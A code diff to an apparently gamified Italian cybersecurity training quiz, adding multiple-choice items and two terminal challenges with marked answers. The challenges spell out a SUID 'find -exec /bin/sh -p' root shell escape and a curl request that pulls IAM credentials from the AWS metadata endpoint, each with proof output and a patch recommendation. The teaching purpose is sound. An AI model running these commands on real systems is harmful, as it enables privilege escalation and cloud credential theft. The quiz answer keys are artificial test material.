-      { id: 'a3_opt4', text: 'RFLAGS (Registro dei Flag)', isCorrect: false }
+      { id: 'a3_opt1', text: 'RIP (Instruction Pointer / Indirizzo di ritorno a 64 bit)', isCorrect: true, explanation: 'Sovrascrivendo l\'indirizzo di ritorno, l\'istruzione RET caricherà in RIP l\'indirizzo scelto dall\'attaccante.' },
+      { id: 'a3_opt2', text: 'RSP (Registro Stack Pointer cima dello stack a 64 bit)', isCorrect: false },
+      { id: 'a3_opt3', text: 'RAX (Registro Accumulatore generale calcoli a 64 bit)', isCorrect: false },
+      { id: 'a3_opt4', text: 'RBP (Registro Base Pointer cornice dello stack 64 bit)', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'CWE-121: Stack-based Buffer Overflow',
@@ -794,10 +1059,10 @@ export const ADVANCED_DIAGNOSTIC_QUESTIONS_IT: HardcoreQuestion[] = [
     prompt: 'In ambiente cloud (AWS/GCP), qual è l\'obiettivo più critico esposto da una vulnerabilità SSRF?',
     codeSnippet: 'POST /api/fetch_avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
     options: [
-      { id: 'a4_opt1', text: 'Instance Metadata Service (IMDS) per estrarre chiavi IAM temporanee', isCorrect: true, explanation: 'L\'indirizzo link-local 169.254.169.254 restituisce i token IAM della macchina, compromettendo il cloud.' },
-      { id: 'a4_opt2', text: 'Cronologia e cookie memorizzati nel browser del client', isCorrect: false },
-      { id: 'a4_opt3', text: 'Avvelenamento della cache DNS locale del router WiFi', isCorrect: false },
-      { id: 'a4_opt4', text: 'Esaurimento delle tabelle MAC hardware dello switch', isCorrect: false }
+      { id: 'a4_opt1', text: 'Instance Metadata Service (IMDS) per estrarre i token dei ruoli IAM cloud', isCorrect: true, explanation: 'L\'indirizzo link-local 169.254.169.254 restituisce i token IAM della macchina, compromettendo il cloud.' },
+      { id: 'a4_opt2', text: 'La cronologia e i cookie memorizzati nella memoria persistente del client', isCorrect: false },
+      { id: 'a4_opt3', text: 'L\'avvelenamento della cache DNS locale tramite risposte UDP falsificate', isCorrect: false },
+      { id: 'a4_opt4', text: 'La saturazione della memoria CAM dello switch tramite spoofing di indirizzi', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'CWE-918: Server-Side Request Forgery (SSRF)',
@@ -817,10 +1082,10 @@ export const ADVANCED_DIAGNOSTIC_QUESTIONS_IT: HardcoreQuestion[] = [
     prompt: 'Cosa fa l\'Address Space Layout Randomization (ASLR) per proteggere il sistema da buffer overflow?',
     codeSnippet: 'AVVIO 1: base libc = 0x7f81a2000000\nAVVIO 2: base libc = 0x7f43b8c00000',
     options: [
-      { id: 'a5_opt1', text: 'Randomizza gli indirizzi di stack, heap e librerie a ogni esecuzione', isCorrect: true, explanation: 'Impedisce all\'attaccante di saltare a indirizzi o gadget ROP prevedibili.' },
-      { id: 'a5_opt2', text: 'Rende la memoria dello stack di sola lettura', isCorrect: false },
-      { id: 'a5_opt3', text: 'Firma crittograficamente i file eseguibili del sistema', isCorrect: false },
-      { id: 'a5_opt4', text: 'Disabilita tutti i puntatori relativi all\'interno della CPU', isCorrect: false }
+      { id: 'a5_opt1', text: 'Randomizza gli indirizzi base di memoria di stack, heap e librerie condivise', isCorrect: true, explanation: 'Impedisce all\'attaccante di saltare a indirizzi o gadget ROP prevedibili.' },
+      { id: 'a5_opt2', text: 'Imposta i permessi di sola lettura sulla memoria dello stack del processo', isCorrect: false },
+      { id: 'a5_opt3', text: 'Applica firme crittografiche sugli header dei file binari dell\'applicazione', isCorrect: false },
+      { id: 'a5_opt4', text: 'Disattiva le operazioni aritmetiche relative sui registri delle istruzioni', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'Mitigazione ASLR & PIE',
@@ -840,10 +1105,10 @@ export const ADVANCED_DIAGNOSTIC_QUESTIONS_IT: HardcoreQuestion[] = [
     prompt: 'Perché impostare `Access-Control-Allow-Origin: null` con `Credentials: true` è rischioso?',
     codeSnippet: 'HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true',
     options: [
-      { id: 'a6_opt1', text: 'Gli iframe sandboxed hanno Origin "null" e possono leggere dati autenticati', isCorrect: true, explanation: 'Un aggressore può usare un iframe sandbox per generare Origin: null e rubare dati riservati della sessione.' },
-      { id: 'a6_opt2', text: 'Disattiva completamente la validazione SSL/TLS nei browser', isCorrect: false },
-      { id: 'a6_opt3', text: 'Costringe il browser a eseguire comandi di shell sul server', isCorrect: false },
-      { id: 'a6_opt4', text: 'Impedisce a utenti legittimi di inviare form o autenticarsi', isCorrect: false }
+      { id: 'a6_opt1', text: 'Gli iframe sandboxed generano Origin "null", permettendo il furto di dati riservati', isCorrect: true, explanation: 'Un aggressore può usare un iframe sandbox per generare Origin: null e rubare dati riservati della sessione.' },
+      { id: 'a6_opt2', text: 'La direttiva disabilita completamente la verifica dei certificati SSL/TLS nel browser', isCorrect: false },
+      { id: 'a6_opt3', text: 'La risposta cross-origin costringe il browser a lanciare script di shell sul server', isCorrect: false },
+      { id: 'a6_opt4', text: 'La mancanza del preflight blocca gli utenti legittimi dall\'invio dei moduli web', isCorrect: false }
     ],
     rootCauseBreakdown: {
       cveOrTopic: 'CWE-942: Policy CORS Troppo Permissiva',
@@ -853,6 +1118,63 @@ export const ADVANCED_DIAGNOSTIC_QUESTIONS_IT: HardcoreQuestion[] = [
     },
     xpReward: 70,
     eloReward: 35
+  },
+  {
+    id: 'diag_adv_term_find',
+    title: 'Terminale Interattivo: Shell Escape con SUID',
+    type: 'terminal_command',
+    domain: 'Linux & Bash',
+    difficulty: 'Zero-Day',
+    prompt: 'Sfrutta il binario `find` con permesso SUID attivo per avviare una shell di root privilegiata (-exec):',
+    terminalPrompt: 'operatore@zeroday:~$',
+    commandPrefix: 'find',
+    commandTarget: 'find . -exec /bin/sh -p \\;',
+    commandChips: ['. -exec /bin/sh -p \\;', '. -name "*.txt" -delete', '. -perm -4000 -ls', '. -type f -exec whoami \\;'],
+    options: [
+      { id: 'af_1', text: '. -exec /bin/sh -p \\;', isCorrect: true, explanation: 'L\'opzione -p preserva i privilegi elevati del proprietario root nella shell generata.' },
+      { id: 'af_2', text: '. -name "*.txt" -delete', isCorrect: false },
+      { id: 'af_3', text: '. -perm -4000 -ls', isCorrect: false },
+      { id: 'af_4', text: '. -type f -exec whoami \\;', isCorrect: false }
+    ],
+    rootCauseBreakdown: {
+      cveOrTopic: 'GTFOBins: Shell Escape via SUID find',
+      whyItWorks: 'Il comando find esegue gli argomenti specificati in -exec ereditando l\'UID effettivo di root.',
+      patchRecommendation: 'Rimuovere i bit SUID dagli strumenti di amministrazione non strettamente necessari.',
+      terminalProof: '$ find . -exec /bin/sh -p \\;\n# whoami\nroot'
+    },
+    xpReward: 75,
+    eloReward: 38
+  },
+  {
+    id: 'diag_adv_term_curl',
+    title: 'Terminale Interattivo: Esfiltrazione Metadati Cloud',
+    type: 'terminal_command',
+    domain: 'Web Sec',
+    difficulty: 'Zero-Day',
+    prompt: 'Usa `curl` per interrogare l\'endpoint link-local AWS IMDSv1 ed estrarre i ruoli IAM configurati:',
+    terminalPrompt: 'operatore@zeroday:~$',
+    commandPrefix: 'curl',
+    commandTarget: 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+    commandChips: [
+      'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+      'https://api.aws.amazon.com/v1/iam/security-credentials/',
+      '-H "Host: metadata" http://127.0.0.1/latest/meta-data/',
+      'http://10.0.0.1/aws/meta-data/iam/credentials'
+    ],
+    options: [
+      { id: 'ac_1', text: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', isCorrect: true, explanation: 'Interroga l\'indirizzo standard cloud link-local (169.254.169.254) estraendo le credenziali IAM.' },
+      { id: 'ac_2', text: 'https://api.aws.amazon.com/v1/iam/security-credentials/', isCorrect: false },
+      { id: 'ac_3', text: '-H "Host: metadata" http://127.0.0.1/latest/meta-data/', isCorrect: false },
+      { id: 'ac_4', text: 'http://10.0.0.1/aws/meta-data/iam/credentials', isCorrect: false }
+    ],
+    rootCauseBreakdown: {
+      cveOrTopic: 'Abuso dell\'Instance Metadata Service v1 AWS (CWE-918)',
+      whyItWorks: 'IMDSv1 rilascia credenziali a qualsiasi richiesta HTTP locale non autenticata verso 169.254.169.254.',
+      patchRecommendation: 'Migrare a IMDSv2 (che impone token di sessione PUT) e limitare il forwarding delle rotte link-local.',
+      terminalProof: '$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\nEC2-Production-Role'
+    },
+    xpReward: 75,
+    eloReward: 38
   }
 ];
 
@@ -865,6 +1187,7 @@ export const ADVANCED_DIAGNOSTIC_QUESTIONS = ADVANCED_DIAGNOSTIC_QUESTIONS_EN;
  * Returns calibrated diagnostic questions based on user's selected level and language.
  * Dynamically picks 3 random questions from the pool and shuffles option order
  * every single time, ensuring initial questions and answers are never static!
+ * Always guarantees at least 1 interactive terminal command sandbox!
  */
 export function getDiagnosticQuestionsForLevel(level: string, lang: Language = getSavedLanguage()): HardcoreQuestion[] {
   let sourceQuestions: HardcoreQuestion[];
@@ -878,8 +1201,13 @@ export function getDiagnosticQuestionsForLevel(level: string, lang: Language = g
     sourceQuestions = isIt ? INTERMEDIATE_DIAGNOSTIC_QUESTIONS_IT : INTERMEDIATE_DIAGNOSTIC_QUESTIONS_EN;
   }
 
-  // Pick 3 random questions from the level pool and shuffle their options with Fisher-Yates
-  const sampled = shuffleArray(sourceQuestions).slice(0, 3);
+  // Ensure at least 1 interactive terminal challenge and 2 conceptual / analysis questions
+  const terminalQuestions = sourceQuestions.filter(q => q.type === 'terminal_command');
+  const otherQuestions = sourceQuestions.filter(q => q.type !== 'terminal_command');
+
+  const pickedTerminal = shuffleArray(terminalQuestions).slice(0, 1);
+  const pickedOthers = shuffleArray(otherQuestions).slice(0, 2);
+  const sampled = shuffleArray([...pickedTerminal, ...pickedOthers]);
 
   return sampled.map(q => ({
     ...q,
@@ -888,3 +1216,4 @@ export function getDiagnosticQuestionsForLevel(level: string, lang: Language = g
 }
 
 export const DIAGNOSTIC_QUESTIONS = INTERMEDIATE_DIAGNOSTIC_QUESTIONS_EN;
+
